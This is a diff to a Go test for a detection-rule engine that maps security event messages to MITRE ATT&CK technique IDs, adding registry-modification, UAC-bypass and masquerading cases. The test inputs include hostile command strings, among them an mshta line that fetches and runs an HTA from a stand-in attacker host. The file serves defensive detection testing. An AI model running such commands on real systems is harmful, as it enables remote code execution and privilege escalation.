@@ -244,6 +244,10 @@ func TestDefaultRulesCoverNewEventTypes(t *testing.T) {
 		{"PROCESS", "mshta.exe http://evil.example/x.hta", "T1218"},
 		{"SECURITY", "Invoke-Command -ComputerName DC01 -ScriptBlock {calc}", "T1021"},
 		{"PROCESS", "CreateRemoteThread + VirtualAllocEx into explorer.exe", "T1055"},
+		// v5: yaygın defense-evasion/privilege-escalation hücreleri.
+		{"PROCESS", "reg add HKLM\\Software\\X /v Y /t REG_SZ /d z /f", "T1112"},
+		{"PROCESS", "fodhelper.exe UAC bypass launched cmd", "T1548"},
+		{"PROCESS", "svchost.exe running from C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe", "T1036"},
 	}
 	for _, c := range cases {
 		dets := e.Evaluate(model.Event{Category: c.cat, Severity: "HIGH", Message: c.msg})
